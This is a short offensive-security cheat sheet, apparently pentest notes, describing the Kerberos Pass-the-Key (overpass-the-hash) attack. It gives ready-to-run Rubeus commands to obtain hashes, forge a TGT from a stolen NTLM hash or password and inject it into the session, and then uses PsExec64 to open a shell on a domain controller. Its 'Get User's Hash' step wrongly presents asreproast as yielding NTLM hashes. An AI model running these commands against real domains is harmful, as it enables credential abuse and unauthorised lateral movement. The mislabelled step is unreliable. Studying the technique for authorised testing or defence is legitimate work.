### Pass-the-Key - Works on Kerberos Only

#### Pass-the-Key attack
**Pass-the-Key is a Kerberos attack** where an ***attacker uses a stolen user key instead of the password to obtain a valid TGT*** for the target and access services. This is incredibly useful in environments where ***NTLM is disabled***.

#### Keys
When the ***RC4 protocol is enabled***, the ***RC4 key is the user's NTLM hash*** and the technique is more commonly known as the `overpass-the-hash`. The ***attack is useful where NTLM is disabled*** and only Kerberos authentication is used.

In environments where RC4 is disabled, other Kerberos keys (DES, AES-128, or AES-256) can be passed instead. This technique is known as `pass-the-key`. The only ***difference between the `overpass-the-hash` and `pass-the-key` are the key used***; the actual technique is exactly the same.

#### Obtaining Keys
There are many ways to obtain keys. Here are two:
- If a user's password is obtained through dumping or hash cracking, all the keys can be derived from it.
- Keys can be dumped from machines where the target user has a session.

#### Get User's Hash
```powershell
Rubeus.exe asreproast
```
#### Performing the attack
**Rubeus to request a TGT using another `user's key**`
```powershell
Rubeus.exe asktgt /domain:<domain FQDN> /user:<target username> /rc4:<target user's NTLM hash> /ptt
```

**Rubeus to request a TGT using another `user's password`**
```powershell
Rubeus.exe asktgt /domain:<domain FQDN> /user:<target username> /password:<password> /ptt
```

- Rubeus will use the supplied RC4 (NTLM) hash automatically to request a TGT from the KDC, and with `/ptt` it will attempt to inject the returned ticket into your current session.

**Verify the ticket been loaded into memory**
```powershell
klist
```

**Once the ticket has been loaded into memory, simply use `PsExec64` to connect to the target**
```powershell
PsExec64 \\dc01.ktown.local cmd
```
***Note: To force the usage of Kerberos, you must use hostnames when connecting to a service. Using IP addresses will make the authentication mechanism fall back to `NTLM` and the attack will fail.***